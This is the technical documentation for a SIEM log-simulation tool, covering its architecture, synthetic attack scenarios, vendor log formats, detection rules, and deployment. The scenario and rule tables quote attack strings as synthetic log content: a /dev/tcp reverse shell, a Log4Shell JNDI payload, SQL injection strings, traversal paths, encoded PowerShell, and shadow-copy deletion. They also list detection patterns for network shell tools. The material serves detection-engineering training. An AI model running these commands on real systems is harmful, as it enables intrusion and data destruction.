# APEX JediSyslogger — Technical Documentation

A browser-based **SIEM log-ingestion simulator** with an optional zero-dependency
Node backend for real syslog forwarding. This document is the full reference:
architecture, data model, every scenario and detection rule, the vendor log
formats, the HTTP API, configuration, and deployment.

- [1. Overview](#1-overview)
- [2. Architecture](#2-architecture)
- [3. Event data model](#3-event-data-model)
- [4. The Syslogger (log source)](#4-the-syslogger-log-source)
- [5. Attack scenarios](#5-attack-scenarios)
- [6. Appliance log formats](#6-appliance-log-formats)
- [7. The Jedi SIEM engine](#7-the-jedi-siem-engine)
- [8. Detection rules](#8-detection-rules)
- [9. File replay](#9-file-replay)
- [10. Live forwarding & the backend API](#10-live-forwarding--the-backend-api)
- [11. Connectivity test](#11-connectivity-test)
- [12. Configuration reference](#12-configuration-reference)
- [13. Deployment](#13-deployment)
- [14. Extending the app](#14-extending-the-app)
- [15. Troubleshooting](#15-troubleshooting)

---

## 1. Overview

APEX JediSyslogger generates synthetic security telemetry and analyses it in real
time, so you can practise **detection engineering** without a live environment. It
has two halves:

| Component     | Role |
|---------------|------|
| **Syslogger** | Synthetic log source — emits RFC 3164 / RFC 5424 syslog and 12 native appliance formats, at a configurable rate, with 26 injectable attack scenarios and file replay. |
| **Jedi**      | Miniature SIEM — parses every event, keeps rolling stats, and runs a stateful, MITRE ATT&CK-tagged detection-rule engine. |

Everything renders in the browser. The optional `server.js` backend serves the
app **and** relays generated logs as real UDP/TCP syslog to an external collector.

All traffic is synthetic. Nothing leaves the browser unless you explicitly enable
**Forward live** (which requires the backend).

---

## 2. Architecture

```
┌──────────────────────── Browser ────────────────────────┐
│                                                          │
│  Syslogger ──emit(event)──▶ Jedi.ingest(event)           │
│  (js/syslogger.js)          (js/jedi.js)                 │
│      │                          │                        │
│      │ raw line                 │ stats + alerts         │
│      ▼                          ▼                        │
│  fwd queue ······▶ POST /forward   UI render (js/ui.js)  │
│                          │         dashboard / stream    │
└──────────────────────────┼──────────────────────────────┘
                           │  (only when "Forward live" is on)
                           ▼
              ┌──────── server.js (Node) ────────┐
              │  /forward → UDP/TCP syslog ───────┼──▶ Collector / SIEM
              │  /test    → reachability probe    │    (Splunk, Graylog,
              │  static file host                 │     Wazuh, rsyslog…)
              └───────────────────────────────────┘
```

**Files**

| File | Responsibility |
|------|----------------|
| `index.html` | Markup / panel scaffold |
| `css/styles.css` | Dark SIEM theme, responsive layout |
| `js/data.js` | Random helpers, host/user/threat-intel pools, RFC 3164/5424 + vendor line formatters |
| `js/syslogger.js` | Baseline generators, attack scenarios, appliance sources, file replay, forward queue |
| `js/jedi.js` | Parsing, correlation windows, detection rules, stats, threat level |
| `js/ui.js` | Dashboard rendering, charts, config wiring, drawer |
| `server.js` | Optional backend: static host + `/forward` relay + `/test` probe |
| `samples/sample.log` | Example mixed-format log for the file-replay demo |

The three engine modules are plain IIFEs that attach to a global `JS` namespace —
no build step, no bundler, no npm dependencies. Load order is data → syslogger →
jedi → ui.

---

## 3. Event data model

Every generated or parsed log is normalised into an **event object** before Jedi
sees it. Common fields:

| Field | Meaning |
|-------|---------|
| `id` | Random unique id |
| `ts` | Epoch ms timestamp |
| `srcType` | Source category (`firewall`, `ssh`, `web`, `dns`, `vpn`, `windows`, `mail`, appliance vendors, `file`) |
| `host` / `hostIp` | Device name / management IP |
| `facility` / `severity` | Syslog numeric facility (0–23) and severity (0–7) |
| `program` / `pid` | Process / tag |
| `srcIp` / `dstIp` / `srcPort` / `dstPort` / `proto` | Network 5-tuple (where relevant) |
| `action` | `ALLOW` / `DENY` / `accept` / `dropped` / etc. |
| `bytes` | Flow size |
| `user`, `eventId`, `url`, `method`, `status`, `domain` | Source-specific fields |
| `vendor` | Appliance vendor key (drives the native raw formatter) |
| `threatSig` / `threatSev` | Appliance IPS/WAF signature + severity (drives detection) |
| `message` | Human-readable summary shown in the stream |
| `raw` | The exact wire line (RFC 3164/5424 or vendor format), shown in the drawer |
| `collector` | The configured `ip:port` destination label |

Syslog severity mapping (lower = more severe): `0 emerg, 1 alert, 2 crit,
3 err, 4 warning, 5 notice, 6 info, 7 debug`.

---

## 4. The Syslogger (log source)

`Syslogger(sink)` emits events to a `sink` callback (Jedi's `ingest`).

**Baseline traffic** — a weighted mix of benign events from firewall, web, ssh,
dns, windows, and vpn, produced on a 100 ms tick at the configured **events per
second** (0–60). Fractional rates accumulate so e.g. 0.5 eps emits one event
every two seconds.

**Key methods**

| Method | Purpose |
|--------|---------|
| `start()` / `stop()` | Run/pause the baseline generator |
| `setEps(n)` | Baseline rate |
| `setFormat('rfc3164' \| 'rfc5424')` | Wire format for the generic sources |
| `injectScenario(id)` | Fire an attack/appliance burst (works even while stopped) |
| `setMaxEvents(n \| null)` | Total volume cap (auto-stops at the cap) |
| `setCollector(ip, port)` | Forwarding/test destination |
| `loadFile(lines, name)` / `setFileMode(bool)` / `setLoop(bool)` | File replay |
| `setForwarding(bool)` / `setForwardProto('udp' \| 'tcp')` | Live forwarding |

The **RFC 3164** vs **RFC 5424** toggle only affects the generic sources;
appliance events always use their native vendor format.

---

## 5. Attack scenarios

**26** scenarios live under the **Attack ›** menu. Each scenario's `build()`
returns a *burst* of event partials crafted to trip a specific detection rule, so
every button demonstrably lights up the dashboard. A burst can be injected even
while the baseline generator is stopped, and its events are spread 30–90 ms apart
so the correlation windows see them as live traffic.

Scenarios are defined in `js/syslogger.js` in two objects that are merged into a
single `SCENARIOS` map: the original eight in `SCENARIOS` and the additional
eighteen in `MORE_ATTACKS`. The **ID** column below is the internal key passed to
`injectScenario(id)`; it is what the `Attack ›` buttons call.

| ID | Scenario | What the burst emits | Fires rule | ATT&CK |
|----|----------|----------------------|-----------|--------|
| `ssh-bruteforce` | SSH Brute Force | 12–20 `sshd` *Failed password* lines from one threat-intel IP; ~30 % of the time a trailing *Accepted password* | `ssh-bruteforce`, `brute-success` | T1110 / T1078 |
| `port-scan` | Port Scan | 20–30 firewall **DENY** events to distinct dst ports on one internal host | `port-scan` | T1046 |
| `sql-injection` | SQL Injection | 3–5 nginx requests with SQLi payloads (`' OR '1'='1`, `UNION SELECT`, `; DROP TABLE`, `SLEEP(5)`) | `sql-injection` | T1190 |
| `c2-beacon` | C2 Beacon | 4–7 firewall **ALLOW** flows from an internal victim to a known-bad IP on 443 / 8443 / 4444 | `c2-beacon` | T1071 |
| `data-exfil` | Data Exfiltration | one firewall **ALLOW** flow of 220–900 MB outbound | `data-exfil` | T1048 |
| `dns-tunneling` | DNS Tunneling | 4–8 DNS **TXT** queries with 40–60-char hex labels under a known-bad domain | `dns-tunneling` | T1071.004 |
| `priv-esc` | Privilege Escalation | a `sudo … USER=root ; COMMAND=/bin/bash` event **plus** a Windows **4672** SeDebugPrivilege event | `priv-esc` | T1068 |
| `malware-detected` | Malware / IDS Hit | one Suricata alert (Cobalt Strike / Emotet / Log4j / PowerShell EncodedCommand) | `ids-malware` | T1204 |
| `log4shell` | Log4Shell RCE | 2–3 web requests carrying `${jndi:ldap://<bad-ip>:1389/Exploit}` in the URL / User-Agent | `web-exploit` | T1190 |
| `xss` | XSS Injection | 2–3 web requests with `<script>` / `onerror=` payloads | `web-exploit` | T1059 |
| `dir-traversal` | Path Traversal / LFI | 2–3 web requests for `../../../../etc/passwd`, `/etc/shadow`, `win.ini` | `web-exploit` | T1083 |
| `web-shell` | Web Shell | 2–3 **POST**s to `shell.php?cmd=`, `c99.php`, `webshell.aspx` | `web-exploit` | T1505.003 |
| `vuln-scan` | Vuln Scan | 5–8 GETs to sensitive paths (`/admin`, `/.git/config`, `/.env`…) with a scanner UA (sqlmap / Nikto / Nessus / Nmap) | `web-exploit` | T1595 |
| `reverse-shell` | Reverse Shell | one shell event `bash -i >& /dev/tcp/<bad-ip>/4444 0>&1` | `reverse-shell` | T1059 |
| `powershell-enc` | Malicious PowerShell | Windows **4688** with `powershell -nop -w hidden -enc <base64>` | `susp-powershell` | T1059.001 |
| `rdp-bruteforce` | RDP Brute Force | 10–16 Windows **4625** LogonType 10 failures from one threat-intel IP | `windows-threat` | T1110 |
| `password-spray` | Password Spray | **4625** across 10 distinct accounts with one password, from one IP | `windows-threat` | T1110.003 |
| `kerberoasting` | Kerberoasting | **4769** RC4 (`0x17`) service-ticket requests for 4 service accounts | `windows-threat` | T1558.003 |
| `dcsync` | DCSync | **4662** with `DS-Replication-Get-Changes-All` replication rights | `windows-threat` | T1003.006 |
| `new-admin` | New Admin Account | **4720** (account created) **+ 4732** (added to Administrators) | `windows-threat` | T1136 |
| `log-cleared` | Audit Log Cleared | **1102** security audit log cleared | `windows-threat` | T1070.001 |
| `pass-the-hash` | Pass-the-Hash | **4624** LogonType 9 / NTLM logon | `windows-threat` | T1550.002 |
| `ransomware` | Ransomware | **4688** `vssadmin delete shadows` + `bcdedit … recoveryenabled no` + **4663** mass `.locked` rename | `ransomware` | T1486 |
| `cryptomining` | Cryptomining | DNS query to a mining pool **plus** a firewall flow to `stratum+tcp://<pool>:3333` | `cryptomining` | T1496 |
| `ddos-synflood` | SYN Flood (DDoS) | 8–12 firewall **DENY** SYN-flood events to one target from spoofed IPs | `dos-flood` | T1498 |
| `phishing` | Phishing Email | one postfix event, `spf=fail dkim=fail dmarc=fail` + a risky attachment (`.exe/.iso/.js/.docm`) | `phishing` | T1566 |

The known-bad IPs and domains used above come from `THREAT_INTEL` in `js/data.js`
(e.g. `185.220.101.44`, `kx7z2q-c2.badnet.ru`); the Jedi engine treats them as
threat-intel matches.

---

## 6. Appliance log formats

**12** sources live under the **Appliance logs ›** menu. Each burst mixes 2–5
benign events with one malicious event, and every event is rendered in the
vendor's **real wire format** (still wrapped in a syslog `<PRI>` header) by the
matching formatter in `js/data.js` → `VENDOR_FORMATTERS`. The RFC 3164 / 5424
toggle does **not** apply — real appliances have fixed formats. The **ID** column
is the internal key the `Appliance logs ›` buttons pass to `injectScenario(id)`.

Two detection paths cover the malicious event in each burst:

- Appliances that carry an IPS/WAF **`threatSig`** field (Palo Alto, FortiGate,
  Sophos, SonicWall, Zscaler, F5, CEF, LEEF) fire the **`appliance-threat`** rule,
  which maps the signature text to an ATT&CK technique.
- Pure firewall appliances with no signature field (Cisco ASA, Check Point,
  pfSense, Juniper) route their malicious event through the generic
  **`c2-beacon`** rule instead (internal host → threat-intel IP).

| ID | Appliance | Format | Detection | Malicious signature / trigger |
|----|-----------|--------|-----------|-------------------------------|
| `paloalto` | Palo Alto (PAN-OS) | CSV | `appliance-threat` | Log4j RCE (91991), SQLi (20568), EternalBlue (40007), Dir Traversal (31337) |
| `fortigate` | FortiGate (FortiOS) | `key=value` | `appliance-threat` | Log4j (51006), SMB OOB read (41435), Cobalt Strike (46774), SQLi (15621) |
| `ciscoasa` | Cisco ASA | `%ASA-lvl-id` | `c2-beacon` | outbound *Built* connection to a known-bad IP (+ inbound `106023` Deny) |
| `checkpoint` | Check Point | `k=v;` | `c2-beacon` | *Accept* to a flagged destination (+ a `Drop`) |
| `sophos` | Sophos XG | `key=value` | `appliance-threat` | SQL-Injection-Attack, Log4j (CVE-2021-44228), Suspicious-Executable-Download |
| `pfsense` | pfSense | filterlog CSV | `c2-beacon` | *pass out* to a flagged destination |
| `juniper` | Juniper SRX | RT_FLOW | `c2-beacon` | RT_FLOW session *created* to a flagged destination |
| `sonicwall` | SonicWall | `id/sn key=value` | `appliance-threat` | Suspected Port Scan, Possible SYN Flood, Malformed packet |
| `zscaler` | Zscaler ZIA | NSS `key=value` | `appliance-threat` | Win32.Trojan.Emotet, JS.Downloader.GenericKD, EICAR-Test-File, Phishing.Kit |
| `f5` | F5 BIG-IP ASM | comma `key=value` | `appliance-threat` | SQL-Injection, XSS, Command-Execution, Predictable-Resource-Location |
| `cef` | CEF (generic ArcSight) | `CEF:0\|…` | `appliance-threat` | Brute Force Attack, Malware Communication, Data Exfiltration Attempt |
| `leef` | LEEF (generic QRadar) | `LEEF:2.0\|…` | `appliance-threat` | Port Scan, Suspect Data Loss, Botnet C2 Communication |

### Example wire lines

Representative malicious lines (values such as timestamps, serials, and session
IDs are randomised at generation time):

**Palo Alto** THREAT (CSV):

```
<130>Jul 16 10:22:41 PA-3220 1,2026/07/16 10:22:41,012345678901,THREAT,vulnerability,0,2026/07/16 10:22:41,185.220.101.44,10.10.1.11,0.0.0.0,0.0.0.0,untrust-to-dmz,,,web-browsing,vsys1,untrust,dmz,ethernet1/1,ethernet1/2,forward-log,2026/07/16 10:22:41,123456,1,54321,443,0,0,0x0,tcp,reset-both,"Apache Log4j Remote Code Execution Vulnerability(91991)",code-execution,critical,client-to-server
```

**FortiGate** IPS (`key=value`):

```
<162>date=2026-07-16 time=10:22:41 devname="FGT60F" devid="FGT12345TK1234567" logid="0419016384" type="utm" subtype="ips" level="critical" vd="root" srcip=185.220.101.44 srcport=51000 dstip=10.10.1.11 dstport=443 proto=6 action="dropped" policyid=12 service="HTTPS" attack="Apache.Log4j.Error.Remote.Code.Execution" attackid=51006 severity="critical" msg="ips dropped …"
```

**Cisco ASA** inbound deny (`%ASA-lvl-id`):

```
<164>Jul 16 10:22:41 ASA-5516 : %ASA-4-106023: Deny tcp src outside:185.220.101.44/51000 dst inside:10.10.1.11/3389 by access-group "outside_access_in"
```

**CEF** (generic ArcSight):

```
<146>Jul 16 10:22:41 arcsight-conn CEF:0|Security|ThreatManager|1.0|912|Malware Communication|9|src=185.220.101.44 dst=10.10.1.11 spt=51000 dpt=443 proto=TCP act=blocked
```

Click any appliance event in the live stream to open the drawer and see its full
raw wire line alongside the parsed fields.

---

## 7. The Jedi SIEM engine

`Jedi.ingest(event)`:

1. Updates counters — total events, per-severity, per-source, timeline buckets.
2. Adds the event to a capped recent-events ring (default 400).
3. Runs every detection rule; each hit becomes an **alert** (capped at 200).

**Rolling metrics**

- **EPS** — events in a trailing 3 s window.
- **Timeline** — per-second buckets of events and alerts (last ~120 s), drawn on
  the canvas chart.
- **Threat level** — sum of the last 2 minutes of alert severities
  (critical = 4, high = 3, medium = 2, low = 1) mapped to
  `GUARDED → ELEVATED → HIGH → SEVERE → CRITICAL`.

**Correlator** — a small stateful helper shared by the rules:

| Primitive | Use |
|-----------|-----|
| `window(ns, key, ms, now)` | Sliding array of timestamps within `ms` |
| `windowSet(ns, key, ms, now, value)` | Sliding set of distinct values (e.g. ports, users) |
| `cooldown(ns, key, ms, now)` | True at most once per `ms` — throttles repeat alerts |

---

## 8. Detection rules

Each rule returns `null` (no match) or an alert `{severity, tactic, technique,
message, srcIp, host, evidence}`. Correlating rules use the primitives above.

| Rule id | Name | Trigger | ATT&CK |
|---------|------|---------|--------|
| `ssh-bruteforce` | SSH Brute-Force | ≥ 8 failed `sshd` logins / IP / 60 s | T1110 |
| `brute-success` | Login After Brute Force | `Accepted password` after a failure burst | T1078 |
| `port-scan` | Horizontal Port Scan | ≥ 15 distinct denied dst ports / IP / 30 s | T1046 |
| `sql-injection` | SQL Injection | SQLi regex in an HTTP request | T1190 |
| `c2-beacon` | C2 / Known-Bad Destination | internal host → threat-intel IP | T1071 |
| `data-exfil` | Large Outbound Transfer | outbound flow > 100 MB | T1048 |
| `dns-tunneling` | DNS Tunneling | long DNS label / known-bad domain | T1071.004 |
| `priv-esc` | Privilege Escalation | `sudo … USER=root` / Win 4672 | T1068 |
| `ids-malware` | IDS Malware Signature | Suricata/ET trojan/exploit | T1204 |
| `appliance-threat` | Appliance IPS / WAF Signature | any `threatSig` present | T1190 (by signature) |
| `web-exploit` | Web Application Attack | Log4Shell / XSS / traversal / web shell / scanner UA | T1190·T1059·T1083·T1505.003·T1595 |
| `windows-threat` | Windows Security Event | 4625 brute/spray, 4769 RC4, 4662 repl, 4732/4720, 1102, 4624 PtH | T1110·T1558.003·T1003.006·T1136·T1070.001·T1550.002 |
| `reverse-shell` | Reverse Shell | `/dev/tcp/`, `nc -e`, `bash -i >&` | T1059 |
| `susp-powershell` | Suspicious PowerShell | `-enc` / `FromBase64String` / hidden window | T1059.001 |
| `cryptomining` | Cryptomining | `stratum+tcp` / known pool | T1496 |
| `ransomware` | Ransomware Behavior | shadow-copy deletion / mass `.locked` | T1486 |
| `dos-flood` | DoS / Flood | flood markers, or ≥ 40 blocks to one host / 5 s | T1498 |
| `phishing` | Phishing Email | SPF/DKIM/DMARC fail + risky attachment | T1566 |

---

## 9. File replay

Load a `.log` / `.txt` / `.csv` / `.json` file in **File replay**, tick **use as
source** and (optionally) **loop**. Each line is parsed best-effort into an event:

- A leading `<PRI>` sets facility/severity; the rest becomes the message.
- Host is extracted from an RFC 3164 or ISO-8601 timestamp prefix if present.
- The first two IPs found populate `srcIp` / `dstIp`, so IP-based rules still fire.
- The original line is preserved verbatim as `raw`.

While active, file lines replace the synthetic baseline and are emitted at the
configured EPS, looping when they reach the end (if **loop** is on). File events
are also forwarded and count toward the volume cap like any other event.

---

## 10. Live forwarding & the backend API

A browser cannot open raw UDP/TCP sockets, so **forwarding requires `server.js`.**
When **Forward live** is on, the browser batches raw lines and POSTs them every
500 ms; the backend emits them to the collector.

### Endpoints

| Method & path | Body | Response | Purpose |
|---------------|------|----------|---------|
| `POST /forward` | `{ip, port, proto, lines[]}` | `{ok, sent, total, error}` | Relay lines as UDP (fire-and-forget) or TCP (newline-framed, RFC 6587) |
| `POST /test` | `{ip, port, proto}` | `{ok, reachable, warn, ms, code, message}` | Reachability probe (see §11) |
| `GET /status` | — | `{ok, backend, forwarded}` | Health / counter |
| `GET /*` | — | file | Static host for the app |

The backend logs every relay to its console:
`→ forwarded N line(s) to <ip>:<port>/udp (UDP: no delivery confirmation)`.

**UDP is fire-and-forget** — a rising "sent" count means packets left the host,
not that the SIEM received them. Use TCP or the Test button to confirm delivery.

---

## 11. Connectivity test

The **Test** button probes the configured `IP:port` via `POST /test`.

| Protocol | Behaviour |
|----------|-----------|
| **TCP** | Real connect. `✓ reachable and port open`, `✗ Connection refused` (ECONNREFUSED), or `✗ timed out` (firewall). Definitive. |
| **UDP** | Connected-UDP probe. `✗ ICMP port-unreachable` if nothing is listening (Linux). An open/filtered port is inconclusive (`◐`) because UDP has no ack. |

Result colouring: green = reachable, amber = inconclusive (UDP open/filtered),
red = failed (with the exact error code).

---

## 12. Configuration reference

All controls live in the header and the **Source & delivery configuration** bar.

| Control | Effect |
|---------|--------|
| Start / Stop Ingestion | Run/pause baseline generation |
| Rate slider | 0–60 baseline events per second |
| RFC 3164 / RFC 5424 | Wire format for generic sources |
| Reset | Clear all state, counters, stream, and alerts |
| Log collector `IP : port` + `UDP/TCP` | Forwarding/test destination |
| **Test** | Probe reachability of that destination |
| **Forward live** | Relay generated logs as real syslog (needs backend) |
| Volume limit — Unlimited / Limit to N | Total-event cap; auto-stops at N |
| File replay — Choose file / loop / use as source | Replay an uploaded log file |
| Stream filter / pause | Filter the live stream; freeze it |

`PORT` env var overrides the backend's listen port (default **8099**).

---

## 13. Deployment

The app is a static site plus a zero-dependency Node backend. **Requirement on the
target: Node.js** (no `npm install`).

### Prerequisites

- **Node.js 14 or newer** (any current LTS) — provides the `node` runtime for the
  backend. Verify with `node --version`. Install it from your OS package manager
  or from <https://nodejs.org>.
- **git** — only needed if you clone the repo (you can download an archive
  instead — see below).
- **Nothing else.** There is no `package.json` and no `npm install` — the backend
  uses only Node's built-in `http`, `dgram`, `net`, `fs`, and `path` modules.

### Getting the code onto a new machine

**Option A — clone with git:**

```bash
git clone https://gitlab.supportlab.cloud/alfreddgreat/apex-jedisyslogger.git
cd apex-jedisyslogger
```

**Option B — download an archive (no git required):**

```bash
# tarball of the main branch
curl -L -o apex.tar.gz \
  "https://gitlab.supportlab.cloud/alfreddgreat/apex-jedisyslogger/-/archive/main/apex-jedisyslogger-main.tar.gz"
tar xzf apex.tar.gz
cd apex-jedisyslogger-main
```

Or from the GitLab web UI: **Code ▾ → Download source code → zip / tar.gz**, then
unpack it. Either way you end up with `index.html`, `server.js`, and the `js/`,
`css/`, `samples/` folders — start it with `node server.js` (see below).

### Copy the files to a remote host

If you already have the project locally and want to push it to a server:

```bash
rsync -av --exclude '.git' --exclude 'node_modules' \
  ./ alfreddgreat@172.26.250.20:/home/alfreddgreat/APEX_JediSyslogger/
```

### Run it

```bash
cd /home/alfreddgreat/APEX_JediSyslogger
node server.js                       # foreground, port 8099
PORT=80 node server.js               # privileged port (needs root/setcap)
nohup node server.js > apex.log 2>&1 &   # detached
```

Then browse to `http://172.26.250.20:8099`.

### Run as a systemd service (recommended)

`/etc/systemd/system/apex-jedisyslogger.service`:

```ini
[Unit]
Description=APEX JediSyslogger SIEM log simulator
After=network.target

[Service]
Type=simple
User=alfreddgreat
WorkingDirectory=/home/alfreddgreat/APEX_JediSyslogger
Environment=PORT=8099
ExecStart=/usr/bin/node server.js
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now apex-jedisyslogger
sudo systemctl status apex-jedisyslogger
```

### Firewall

Open the dashboard port to your clients, and — if forwarding — allow egress to
the collector:

```bash
sudo ufw allow 8099/tcp             # dashboard
sudo ufw allow out 514/udp          # syslog egress (adjust to your collector)
```

---

## 14. Extending the app

- **New generic log source** — add a builder to `BASELINE` in `js/syslogger.js`
  and a `SOURCE_META` colour/label in `js/ui.js`.
- **New appliance format** — add a formatter to `VENDOR_FORMATTERS` in
  `js/data.js` and a generator to `APPLIANCE` in `js/syslogger.js`.
- **New attack scenario** — add an entry to `MORE_ATTACKS` (or `SCENARIOS`) in
  `js/syslogger.js`; set `threatSig` or emit content a rule matches.
- **New detection rule** — push a rule object into `makeRules()` in `js/jedi.js`.
  Use `ctx.window()` / `ctx.windowSet()` / `ctx.cooldown()` for correlation.

Every scenario should be wired to at least one rule — the headless harness pattern
(load `js/*` under a stubbed `window`, inject each scenario, assert alerts fire) is
the quickest way to verify coverage.

---

## 15. Troubleshooting

| Symptom | Cause / fix |
|---------|-------------|
| "Forward live" green but SIEM sees nothing | UDP is fire-and-forget. Click **Test** or switch to TCP; run `tcpdump -n port 514` on the collector. |
| Test shows `Connection refused` | Host reachable, nothing listening on that port/proto — enable the SIEM's syslog input. |
| Test shows `timed out` | Firewall/routing dropping traffic between the hosts. |
| Forwarding foot says "backend not running" | You opened the app statically (python/`file://`). Serve it with `node server.js`. |
| Port 8099 in use | `PORT=9000 node server.js`. |
| Nothing happens on Start | Rate slider at 0, or a volume cap already reached — check the volume foot. |

---

Created By: **Alfredo Nacino** · [www.alfredonacino.com](https://www.alfredonacino.com) · alfredo@nacino.net
